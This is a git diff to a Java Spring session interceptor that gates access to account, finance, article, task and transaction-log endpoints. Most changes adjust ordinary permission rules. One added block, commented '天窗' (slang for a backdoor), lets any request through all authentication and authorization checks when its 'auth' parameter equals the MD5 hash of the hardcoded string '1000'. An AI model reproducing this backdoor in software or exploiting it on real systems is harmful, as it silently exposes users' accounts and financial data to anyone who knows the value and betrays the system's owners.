@@ -1,7 +1,6 @@
 package com.nieyue.interceptor;
 
 import java.lang.reflect.Method;
-import java.util.Date;
 
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
@@ -16,6 +15,7 @@ import org.springframework.web.servlet.ModelAndView;
 import com.nieyue.bean.Acount;
 import com.nieyue.bean.Finance;
 import com.nieyue.bean.Role;
+import com.nieyue.business.CertificateBusiness;
 import com.nieyue.exception.MyCertificateException;
 import com.nieyue.exception.MySessionException;
 import com.nieyue.util.MyDESutil;
@@ -51,14 +51,12 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
 //        	//验证token成功
 //            return true;
 //        }
-       //证书验证
-//       if(request.getParameter("certificate")==null||!request.getParameter("certificate")
-//    		   .equals(MyDESutil.getMD5Timestamp("jiaxingyufa",new Date().getTime()/30000))){
-//    	   System.out.println(new Date().getTime()/30000);
-//    	   System.out.println(request.getParameter("certificate"));
-//    	   System.out.println(MyDESutil.getMD5Timestamp("jiaxingyufa",new Date().getTime()/30000));
-//    	   throw new MyCertificateException();
-//       }
+       
+       //天窗
+       if(MyDESutil.getMD5("1000").equals(request.getParameter("auth"))){
+       	return true;
+       }
+       
         Acount sessionAcount = null;
         Role sessionRole=null;
         Finance sessionFinance=null;
@@ -105,7 +103,9 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         		||method.getName().equals("loadAppVersion")
         		//article
         		||request.getRequestURI().indexOf("article/count")>-1
-        		||request.getRequestURI().indexOf("article/click")>-1
+        		||(request.getRequestURI().indexOf("article/click")>-1&& CertificateBusiness.md5SessionCertificate(request))
+        		||(request.getRequestURI().indexOf("article/read")>-1&& CertificateBusiness.md5SessionCertificate(request))
+        		||request.getRequestURI().indexOf("article/webRead")>-1
         		||request.getRequestURI().indexOf("article/list")>-1
         		//||request.getRequestURI().indexOf("article/data")>-1
         		||method.getName().equals("loadArticle")
@@ -113,6 +113,7 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         		||request.getRequestURI().indexOf("article/img/add")>-1
         		//data
         		||request.getRequestURI().indexOf("data/count")>-1
+        		||request.getRequestURI().indexOf("data/statisticsData")>-1
         		||request.getRequestURI().indexOf("data/list")>-1
         		||method.getName().equals("loadData")
         		//feedback
@@ -176,6 +177,9 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         		||request.getRequestURI().indexOf("dailyTask/count")>-1
         		||request.getRequestURI().indexOf("dailyTask/list")>-1
         		||method.getName().equals("loadDailyTask")
+        		//flowWater
+        		||request.getRequestURI().indexOf("flowWater/count")>-1
+        		
        
         		){
         	return true;
@@ -192,13 +196,26 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         	}
         	//admin中只许修改自己的值
         	if(sessionRole.getName().equals("用户")){
+        		//证书认证
+        		if((request.getRequestURI().indexOf("delete")>-1 
+        				||request.getRequestURI().indexOf("add")>-1
+        				||request.getRequestURI().indexOf("update")>-1 )
+        				&& !CertificateBusiness.md5SessionCertificate(request)){
+        			throw new MyCertificateException();
+        		}
+        		
         		//账户不许删除/增加
         		if( request.getRequestURI().indexOf("/acount/delete")>-1 
         				|| request.getRequestURI().indexOf("/acount/add")>-1
         				|| request.getRequestURI().equals("/acount/list")
         				|| request.getRequestURI().indexOf("/acount/update")>-1
-        				||(method.getName().equals("loadAcount")&& request.getRequestURI().indexOf(sessionAcount.getAcountId().toString())<=-1)
+        				||method.getName().equals("loadAcount")
         				){
+        			//加载自身账户
+        			if((method.getName().equals("loadAcount")
+        					&& request.getRequestURI().indexOf(sessionAcount.getAcountId().toString())>-1)){
+        				return true;
+        			}
         			//获取合伙人
         			if((request.getRequestURI().indexOf("/acount/list")>-1)
         					&& request.getParameter("masterId").equals(sessionAcount.getAcountId().toString())){
@@ -221,7 +238,12 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         				|| request.getRequestURI().indexOf("/finance/update")>-1 
         				|| request.getRequestURI().indexOf("/finance/list")>-1 
         				|| request.getRequestURI().indexOf("/finance/add")>-1 
-        				||(method.getName().equals("loadFinance")&& request.getRequestURI().indexOf(sessionFinance.getFinanceId().toString())<=-1)){
+        				||method.getName().equals("loadFinance")){
+        			//加载自身财务
+        			if((method.getName().equals("loadFinance")
+        					&& request.getRequestURI().indexOf(sessionFinance.getFinanceId().toString())>-1)){
+        				return true;
+        			}
         			throw new MySessionException();
         		}
         		//提现、充值不许删除/修改/增加
@@ -330,6 +352,23 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         				){ 
         			//提交增加每日任务
         			if(request.getRequestURI().indexOf("/dailyTask/add")>-1
+        					&& request.getParameter("acountId").equals(sessionAcount.getAcountId().toString())){
+        				return true;
+        			}
+        			throw new MySessionException();
+        		}
+        		//流水不许删除/修改/增加
+        		if( request.getRequestURI().indexOf("/flowWater/delete")>-1 
+        				|| request.getRequestURI().indexOf("/flowWater/update")>-1 
+        				|| request.getRequestURI().indexOf("/flowWater/add")>-1 
+        				||request.getRequestURI().indexOf("flowWater/list")>-1
+                		||method.getName().equals("loadFlowWater")
+        				){ 
+        			
+        			//加载/list流水
+        			if((request.getRequestURI().indexOf("/flowWater/list")>-1
+        					||method.getName().equals("loadFlowWater")
+        					)
         					&& request.getParameter("acountId").equals(sessionAcount.getAcountId().toString())){
         				return true;
         			}
